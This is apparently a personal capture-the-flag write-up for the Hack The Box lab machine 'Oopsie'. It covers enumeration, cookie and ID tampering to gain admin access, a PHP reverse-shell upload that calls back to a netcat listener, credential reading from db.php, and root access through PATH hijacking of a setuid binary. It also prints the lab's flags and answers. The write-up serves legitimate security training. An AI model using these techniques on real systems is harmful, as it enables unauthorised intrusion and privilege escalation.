- - - 
created : 02-08-2025 

Tags : #veryeasy
- - - 
# Objective

Learn how to start.
# CONNECT

To attack the target machine, you must be on the same network.  
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.  
If you don't see an update after 2-3 minutes, refresh the page.

I will use OpenVPN, so i download the config file, go in the same directory and execute the following command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ sudo openvpn starting_point_mdn0x.ovpn 
[sudo] password di mdn0x: 
```

We can start our [Vulnerable Machine](../../../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md).

Now we add the target IP to our /etc/hosts file, so we don't have to remember the [IP address](../../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) every time :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ sudo nano /etc/hosts
```

We add a line with the given IP and a name .
# Task 1

With what kind of tool can intercept web traffic?

```
 proxy
```
# Task 2

What is the path to the directory on the webserver that returns a login page?

## Reconnaissance

### Rustscan/Nmap

We use [Rustscan](../../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) thath will pass the result to [Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) with this command to scan the target :

```bash
 ┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Oopsie]
└─$ rustscan -a oopsie.htb -- -A 

Open 10.129.130.132:22
Open 10.129.130.132:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

Let's visit the [Webpage](../../../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) :

![Pasted image 20250802125409.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802125409.png)

Found another hostname, let's add it to our /etc/hosts file :

```
10.129.130.132 oopsie.htb  megacorp.com
```

If we look at the [Source Code](../../../../3%20-%20Tags/Hacking%20Concepts/Source%20Code.md) :

![Pasted image 20250802132610.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802132610.png)

We have our answer :`/cdn-cgi/login`
## Enumeration
### DirSearch

We use [Dirsearch](../../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) to start [Enumeration](../../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Oopsie]
└─$ dirsearch -u http://megacorp.com  

[12:57:30] 301 -  309B  - /js  ->  http://megacorp.com/js/                  
[12:57:33] 403 -  277B  - /.ht_wsr.txt                                      
[12:57:34] 403 -  277B  - /.htaccess.bak1                                   
[12:57:34] 403 -  277B  - /.htaccess.orig                                   
[12:57:34] 403 -  277B  - /.htaccess.sample                                 
[12:57:34] 403 -  277B  - /.htaccess.save
[12:57:34] 403 -  277B  - /.htaccess_sc                                     
[12:57:34] 403 -  277B  - /.htaccess_extra                                  
[12:57:34] 403 -  277B  - /.htaccessBAK
[12:57:34] 403 -  277B  - /.htaccess_orig
[12:57:34] 403 -  277B  - /.htaccessOLD
[12:57:34] 403 -  277B  - /.htaccessOLD2
[12:57:34] 403 -  277B  - /.htm                                             
[12:57:34] 403 -  277B  - /.html
[12:57:34] 403 -  277B  - /.htpasswd_test                                   
[12:57:34] 403 -  277B  - /.httr-oauth
[12:57:34] 403 -  277B  - /.htpasswds
[12:57:35] 403 -  277B  - /.php                                             
[12:57:59] 301 -  310B  - /css  ->  http://megacorp.com/css/                
[12:58:05] 301 -  312B  - /fonts  ->  http://megacorp.com/fonts/            
[12:58:07] 403 -  277B  - /images/                                          
[12:58:07] 301 -  313B  - /images  ->  http://megacorp.com/images/
[12:58:09] 403 -  277B  - /js/                                              
[12:58:26] 403 -  277B  - /server-status                                    
[12:58:26] 403 -  277B  - /server-status/                                   
[12:58:33] 403 -  277B  - /themes/                                          
[12:58:33] 301 -  313B  - /themes  ->  http://megacorp.com/themes/
[12:58:35] 301 -  314B  - /uploads  ->  http://megacorp.com/uploads/        
[12:58:35] 403 -  277B  - /uploads

Task Completed               
```
# Task 3

What can be modified in Firefox to get access to the upload page?

```bash
  Cookie
```
# Task 4

What is the access ID of the admin user?
## Exploit

We login as Guest :

![Pasted image 20250802133014.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802133014.png)

Then to Account :

![Pasted image 20250802133109.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802133109.png)

If we change the id parameter we can see other accounts IDs :

![Pasted image 20250802133648.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802133648.png)

For admin is `34322`.

We can see others :

![Pasted image 20250802133211.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802133211.png)

For superadmin is `86575`.
# Task 5

On uploading a file, what directory does that file appear in on the server?

```bash
 /uploads
```
## Reverse Shell

Pretty obvious, we'll do it and try to upload a [Reverse Shell](../../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md).

First we need to have superadmin rights so we change the [Cookies](../../../../3%20-%20Tags/Hacking%20Concepts/Cookies.md) parameter to the right ID, we can do it with [Developer tools](../../../../3%20-%20Tags/Hacking%20Concepts/Developer%20tools.md) in browser :

![Pasted image 20250802135122.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802135122.png)

Now we reload the page :

![Pasted image 20250802135149.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802135149.png)

We'll use pentestmonkey php [Reverse Shell](../../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md), you can find it here https://github.com/pentestmonkey/php-reverse-shell,(make sure to change the IP and listening port) :

![Pasted image 20250802135503.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250802135503.png)

Now we open a [Netcat](../../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener on the same port we setup in the code :

```bash                   
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Oopsie]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

And we go to the file at the link `http://megacorp.com/uploads/php-reverse-shell.php` :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Oopsie]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.231] from (UNKNOWN) [10.129.130.132] 37220
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:58:12 up  1:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
# Task 6

What is the file that contains the password that is shared with the robert user?

we found the password under `/var/www/html/cdn-cgi/login` .

And we can find the username and password in the `db.php` :

```bash
 $ cd //var/www/html/cdn-cgi/login
$ ls
admin.php
db.php
index.php
script.js
$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```
# Task 7

What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? 
## Shell Stabilization

Let's find out, we switch user to `robert` with the found password, but to do that first we have to perform a [Shell Stabilization](../../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) : 

```bash
$ su robert
su: must be run from a terminal
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@oopsie://$ export TERM=xterm
export TERM=xterm
www-data@oopsie://$ ^Z
zsh: suspended  nc -lvnp 1337
                 
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 2/Oopsie]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                reset
www-data@oopsie://$ su robert
Password: 
```

Now we can try to search for the asked types of files with this query :

```bash
robert@oopsie://$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
robert@oopsie://$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
obert@oopsie://$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
```

The answer is `find`.
# Task 8

Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?

```bash
  root
```
# Task 9

What SUID stands for?

```
 Set owner User ID
```
# Task 10

What is the name of the executable being called in an insecure manner?

We can try to use the file, with ID=15 i got the answer `cat` :

```bash
robert@oopsie://$ /usr/bin/bugtracker 

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 15
---------------

cat: /root/reports/15: No such file or directory
```
# Submit Flags

## Submit user flag

We can find the flag in robert's home :

```bash
robert@oopsie://$ cd --
robert@oopsie:~$ cat user.txt 
f2c74ee8db7983851ab2a96a44eb7981
```
## Submit root flag 

## Privilege Escalation with PATH manipulation

We start [Privilege Escalation](../../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md), we can create a malicious file in /tmp directory and change the PATH variable to hit it first, we'll do as follow :

```bash
robert@oopsie:/tmp$ echo '/bin/sh' > cat 
robert@oopsie:/tmp$ chmod +x cat 
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
robert@oopsie:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Now we try to use **bugtracker** again :

```
robert@oopsie:/tmp$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 15
---------------

# whoami
root
# cd /root
# ls
reports  root.txt
# cat root.txt      
# less root.txt

af13b0bee69f8a877c3faf667f7beacf
```

Pwned !!